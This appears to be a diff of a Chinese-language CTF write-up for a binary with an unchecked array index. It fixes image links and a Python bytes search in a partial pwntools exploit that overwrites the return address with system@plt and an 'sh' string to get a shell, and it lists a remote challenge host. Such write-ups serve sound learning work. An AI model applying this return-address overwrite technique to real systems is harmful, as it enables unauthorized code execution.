@@ -10,11 +10,11 @@
 
 2. 用IDA分析，看到“3. change number”功能下的array[count] = num未进行边际检查，因此有数组越界漏洞。
 
-[]
+![](1.jpg)
 
 3. 使用GDB动态分析，确定array数组的起始位置，计算数组起始位置至ebp、返回地址的距离。
 
-[]
+![](2.jpg)
 
 4. 代码实现POC
 ```python
@@ -37,8 +37,8 @@ p = pwn.process('./3fb1a42837be485aae7d85d11fbc457b')   # 本地连接
 #p = pwn.remote('220.249.52.133', 54376)    # 远程连接                                                                               
                                                                                                                                   
 elf = pwn.ELF('./3fb1a42837be485aae7d85d11fbc457b')                                                                 
-system_addr = '0' + hex(elf.plt['system'])[2:]      # 调整为 '08048450'，方便按字节转换为整型
-sh_addr = '0' + hex(next(elf.search('sh')))[2:]     # 调整为 '08048987'，方便按字节转换为整型                          
+system_addr = '0' + hex(elf.plt['system'])[2:]       # 调整为 '08048450'，方便按字节转换为整型
+sh_addr = '0' + hex(next(elf.search(b'sh')))[2:]     # 调整为 '08048987'，方便按字节转换为整型                          
                                                                                                                     
 system_addr = hextoint(system_addr)[::-1]     # hextoint()把每个字节的字符串型十六进制数转换成int型，如：[80, 132, 4, 8]    
 sh_addr = hextoint(sh_addr)[::-1]             # [135, 137, 4, 8]
@@ -62,3 +62,4 @@ for i in range(4):
 p.sendlineafter(b'5. exit', b'5')
 
 p.interactive()
+```
